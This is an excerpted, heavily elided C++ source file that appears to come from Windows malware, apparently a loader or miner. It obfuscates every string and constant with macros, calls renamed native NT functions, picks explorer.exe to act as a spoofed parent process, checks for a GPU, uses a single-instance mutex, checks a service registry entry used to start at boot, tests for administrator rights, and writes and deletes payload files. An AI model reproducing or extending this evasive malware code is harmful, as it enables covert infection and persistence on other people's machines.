...
int GetDllFilesInDirectory(const wchar_t *folderPath, wchar_t dllFiles[MAX_DLL_FILES][MAX_PATH]) {
    ...
    int count = 0;
    do {
        wcscpy(dllFiles[count], findFileData.cFileName);
        count++;
    } while (FindNextFileW(hFind, &findFileData) != 0 && count < MAX_DLL_FILES);
    FindClose(hFind);
    return count;
...
std::wstring GetFileDirectory(wchar_t *filePath_t) {
    std::wstring filePath = filePath_t;
    size_t pos = filePath.find_last_of(L"\\/");
    std::wstring fileDir = filePath.substr(0, pos + 1);
    return fileDir;
}
...
PROCESS_INFORMATION
create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags,
                            DWORD threadFlags) {
    /*
    ...
    */
    ...
    while (true) {
        status = UtQuerySystemInformation(SystemProcessInformation, buffer, (ULONG) bufferLength,
                                          (PULONG) &bufferLength);
        if (status != AYU_OBFC(STATUS_INFO_LENGTH_MISMATCH)) {
            break;
        }
        UtAllocateVirtualMemory(UtCurrentProcess(), &buffer, 0, &bufferLength, AYU_OBFC(MEM_COMMIT | MEM_RESERVE),
                                AYU_OBFC(PAGE_READWRITE));
    }
    if (NT_SUCCESS(status)) {
        ...
        while (true) {
            ...
            if (pspi->ImageName.Length > 0 &&
                !wcsncmp(pspi->ImageName.Buffer, AYU_OBFW(L"explorer.exe"), AYU_OBFC(12))) {
    ...
    UNICODE_STRING start_directory = startDir ? init_unicode_string(startDir)
                                              : parentPEB->ProcessParameters->CurrentDirectory.DosPath;
    ...
    UtAllocateVirtualMemory(UtCurrentProcess(), &ProcessParametersData, 0, &ProcessParametersSize,
                            AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE));
    ...
    UtAllocateVirtualMemory(UtCurrentProcess(), &AttributeListData, 0, &AttributeListSize,
                            AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE));
    ...
    UtCreateUserProcess(&pi.hProcess, &pi.hThread, AYU_OBFC(PROCESS_ALL_ACCESS), AYU_OBFC(THREAD_ALL_ACCESS), NULL,
                        NULL, processFlags, threadFlags, ProcessParameters, &CreateInfo, AttributeList);
...
bool has_gpu() {
    UNICODE_STRING regKey = init_unicode_string(AYU_OBFW(
    ...
    if (NT_SUCCESS(UtOpenKey(&hKey, AYU_OBFC(KEY_ENUMERATE_SUB_KEYS), &attr))) {
        for (ULONG i = 0;
             UtEnumerateKey(hKey, i, KeyBasicInformation, subKeyBuffer, AYU_OBFC(sizeof(subKeyBuffer)), &infoLength) !=
             AYU_OBFC(STATUS_NO_MORE_ENTRIES); ++i) {
            HANDLE hSubKey = NULL;
            ...
            if (NT_SUCCESS(UtOpenKey(&hSubKey, AYU_OBFC(KEY_QUERY_VALUE), &attr))) {
                if (NT_SUCCESS(UtQueryValueKey(hSubKey, &providerKey, KeyValueFullInformation, valueBuffer,
                                               AYU_OBFC(sizeof(valueBuffer)), &infoLength))) {
                    wchar_t *providerName = (wchar_t *) ((BYTE *) valueBuffer +
                                                         ((PKEY_VALUE_FULL_INFORMATION) valueBuffer)->DataOffset);
...
bool check_mutex(wchar_t *mutex) {
    ...
    if (mutex != NULL) {
        ...
        HANDLE hMutex = NULL;
        mutexActive = !NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, FALSE)) ||
...
char *get_envA(char *env, char *env_name) {
    ...
    for (; *env; env += strlen(env) + 1) {
        if (strnicmp(env, env_name, env_name_len) == 0) {
            return env + env_name_len;
        }
    }
    return nullptr;
...
std::string getEnvironmentVariable(const char *varName) {
    char *value = nullptr;
    DWORD size = GetEnvironmentVariable(varName, value, 0);
    ...
    value = new char[size];
    GetEnvironmentVariable(varName, value, size);
...
bool install_check(wchar_t *imagePath) {
    ...
    UNICODE_STRING regKey = init_unicode_string(
            AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" LSTARTUPENTRYNAME));
    OBJECT_ATTRIBUTES attr = {0};
    InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);
    ...
    if (!NT_SUCCESS(UtQueryValueKey(hServiceKey, &uvalue, KeyValuePartialInformation, buffer, AYU_OBFC(sizeof(buffer)),
                                    &length)) ||
        wcsnicmp(imagePath, (wchar_t *) pValueInfo->Data, pValueInfo->DataLength / AYU_OBFC(sizeof(wchar_t))) != 0) {
        UtClose(hServiceKey);
        return false;
    }
    ...
    if (!NT_SUCCESS(UtQueryValueKey(hServiceKey, &uvalue, KeyValuePartialInformation, buffer, AYU_OBFC(sizeof(buffer)),
                                    &length)) || AYU_OBFC(2) != *(DWORD *) pValueInfo->Data) {
        UtClose(hServiceKey);
        return false;
    }
    ...
    UtClose(hServiceKey);
    wchar_t ntPath[MAX_PATH + 4] = {0};
    combine_path(ntPath, AYU_OBFW(L"\\??\\"), imagePath);
    UNICODE_STRING ustring = init_unicode_string(ntPath);
    InitializeObjectAttributes(&attr, &ustring, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);
    FILE_BASIC_INFORMATION file_info;
    if (!NT_SUCCESS(UtQueryAttributesFile(&attr, &file_info))) {
        return false;
    }
    return true;
}
    ...
    for (; *dir_path; ++dir_path, ++ptr) {
        *ptr = *dir_path;
        if (*dir_path == AYU_OBFC(L'\\') || *dir_path == AYU_OBFC(L'/')) {
            ...
            if (NT_SUCCESS(UtCreateFile(&file, AYU_OBFC(FILE_GENERIC_WRITE), &attr, &status_block, NULL,
                                        AYU_OBFC(FILE_ATTRIBUTE_NORMAL), 0, AYU_OBFC(FILE_OPEN_IF),
                                        AYU_OBFC(FILE_DIRECTORY_FILE), NULL, 0))) {
                UtClose(file);
            }
...
PVOID read_file(wchar_t *filePath, ULONG *outFileSize) {
    ...
    IO_STATUS_BLOCK status_block = {0};
    if (!NT_SUCCESS(
            UtOpenFile(&hFile, AYU_OBFC(SYNCHRONIZE | GENERIC_READ), &attr, &status_block, AYU_OBFC(FILE_SHARE_READ),
                       AYU_OBFC(FILE_SYNCHRONOUS_IO_NONALERT)))) {
        return NULL;
    }

    FILE_STANDARD_INFORMATION fileInfo = {0};
    if (!NT_SUCCESS(UtQueryInformationFile(hFile, &status_block, &fileInfo, AYU_OBFC(sizeof(fileInfo)),
    ...
    *outFileSize = fileInfo.EndOfFile.QuadPart;
    ...
    if (!NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &fileData, 0, &allocatedSize,
                                            AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE))) ||
        !NT_SUCCESS(UtReadFile(hFile, NULL, NULL, NULL, &status_block, fileData, *outFileSize, NULL, NULL))) {
        UtClose(hFile);
        *outFileSize = 0;
        return NULL;
    }
...
void write_file(wchar_t *file_path, PVOID paylad_buf, ULONG payload_size) {
    ...
    IO_STATUS_BLOCK status_block = {0};
    if (NT_SUCCESS(
            UtCreateFile(&hFile, AYU_OBFC(DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE), &attr, &status_block,
                         NULL, AYU_OBFC(FILE_ATTRIBUTE_NORMAL), AYU_OBFC(FILE_SHARE_READ | FILE_SHARE_WRITE),
                         AYU_OBFC(FILE_SUPERSEDE), AYU_OBFC(FILE_SYNCHRONOUS_IO_NONALERT), NULL, 0))) {
...
void delete_file(wchar_t *file_path) {
    ...
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK status_block = {0};
    if (NT_SUCCESS(UtOpenFile(&hFile, AYU_OBFC(DELETE | SYNCHRONIZE | GENERIC_WRITE), &attr, &status_block,
                              AYU_OBFC(FILE_SHARE_WRITE), AYU_OBFC(FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT)))) {
...
bool check_administrator() {
    ...
    ULONG ul = 0;
    if (hToken &&
        NT_SUCCESS(UtQueryInformationToken(hToken, TokenElevation, &elevation, AYU_OBFC(sizeof(elevation)), &ul))) {
        UtClose(hToken);
